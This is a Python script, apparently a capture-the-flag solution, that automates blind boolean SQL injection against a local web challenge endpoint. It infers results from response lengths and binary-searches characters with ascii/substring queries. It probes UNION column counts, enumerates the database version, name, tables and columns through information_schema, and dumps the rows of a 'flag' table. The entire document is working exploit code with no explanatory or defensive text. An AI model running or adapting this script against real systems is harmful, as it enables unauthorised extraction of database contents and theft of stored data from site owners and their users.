import requests

cookie_val = "your session cookie value"
cookie = {"connect.sid": cookie_val}

def check_char(sql):
    while True:
        try:
            baseURL = f"1' or ({sql}) and '1' = '1"
            payload = {"id": baseURL}
            response = requests.post("http://localhost/challenge/web/web3/submit", cookies=cookie, data=payload)
            if response.headers["Content-Length"] == "55":
                return True
            elif response.headers["Content-Length"] == "85":
                return False
        except requests.RequestException:
            continue

def find_oneChar(sql, index):
    start = 1
    end = 127
    while start <= end:
        mid = (start + end) // 2
        SQL_flame_same = f"(ascii(substring(({sql}), {index}, 1))) = {mid}"
        SQL_flame_bigger = f"(ascii(substring(({sql}), {index}, 1))) > {mid}"
        if check_char(SQL_flame_same):
            return chr(mid)
        elif check_char(SQL_flame_bigger):
            start = mid + 1
        else:
            end = mid - 1
    return False

def find_word(sql):
    index = 1
    word = ""
    while c := find_oneChar(sql, index):
        print(c, end="", flush=True)
        word += c
        index += 1
    return word

def find_column_count():
    for i in range(1, 11):
        try:
            testSQL = f"1' UNION SELECT {'1,' * (i - 1)} '1' -- "
            response = requests.post("http://localhost/challenge/web/web3/submit", cookies=cookie, data={"id": testSQL})
            if response.headers["Content-Length"] != "85":
                return i
        except requests.RequestException:
            continue
    return 0

def check_char_for_union(sql):
    while True:
        try:
            payload = {"id": sql}
            response = requests.post("http://localhost/challenge/web/web3/submit", cookies=cookie, data=payload)
            if response.headers["Content-Length"] == "55":
                return True
            elif response.headers["Content-Length"] == "85":
                return False
        except requests.RequestException:
            continue

def find_oneChar_for_union(sql, index):
    start = 1
    end = 127
    while start <= end:
        mid = (start + end) // 2
        modified_sql = f"1' or ascii(substring(({sql}), {index}, 1)) = {mid} -- "
        if check_char_for_union(modified_sql):
            return chr(mid)
        elif check_char_for_union(f"1' or ascii(substring(({sql}), {index}, 1)) > {mid} -- "):
            start = mid + 1
        else:
            end = mid - 1
    return False

def find_table_name_with_union(n):
    table_name = ""
    index = 1
    while True:
        char = find_oneChar_for_union(f"(SELECT table_name FROM information_schema.tables WHERE table_schema = '{db_name}' ORDER BY table_name LIMIT 1 OFFSET {n})", index)
        if not char:
            break
        table_name += char
        index += 1
    return table_name

def find_column_name_with_union(n):
    column_name = ""
    index = 1
    while True:
        char = find_oneChar_for_union(f"(SELECT column_name FROM information_schema.columns WHERE table_name = '{table_name}' ORDER BY column_name LIMIT 1 OFFSET {n})", index)
        if not char:
            break
        column_name += char
        index += 1
    return column_name

# MySQL Version
versionSQL = "select version()"
print("Database Version: ", end="")
find_word(versionSQL)
print("")

# MySQL Database Name
databaseSQL = "select database()"
print("Database Name: ", end="")
find_word(databaseSQL)
print("")

db_name = "cuha_ctf"

# Find the column count for UNION queries
column_count = find_column_count()
if column_count:
    print(f"Found column count: {column_count}")
else:
    print("Failed to find the column count")

# MySQL Table Name via UNION
print("============Table Name============")

n = 0

while True:
    table_name_for_union = find_table_name_with_union(n)
    if not table_name_for_union:
        break
    print(f"{n+1} Table:", table_name_for_union)
    n += 1

table_name = "flag"

# MySQL Column Name via UNION
print("============Column Name============")

n = 0

while True:
    column_name_for_union = find_column_name_with_union(n)
    if not column_name_for_union:
        break
    print(f"{n+1} Column:", column_name_for_union)
    n += 1


# MySQL data
column_name1 = "number"
column_name2 = "challenge_title"
column_name3 = "flag"
tbname = "flag"

n = 0
while True:  
    print("============", end="")
    dataSQL1 = f"select {column_name1} from {tbname} order by {column_name1} asc limit {n}, 1"
    data1 = find_word(dataSQL1)
    if data1 == "":
        break
    print(" Flag", end="")
    print("============")

    print("Challenge Title: ", end="")
    dataSQL2 = f"select {column_name2} from {tbname} order by {column_name1} asc limit {n}, 1"
    data3 = find_word(dataSQL2)
    if data3 == "":
        break
    print("")

    print("Flag Value: ", end="")
    dataSQL3 = f"select {column_name3} from {tbname} order by {column_name1} asc limit {n}, 1"
    data2 = find_word(dataSQL3)
    if data2 == "":
        break
    print("")

    n += 1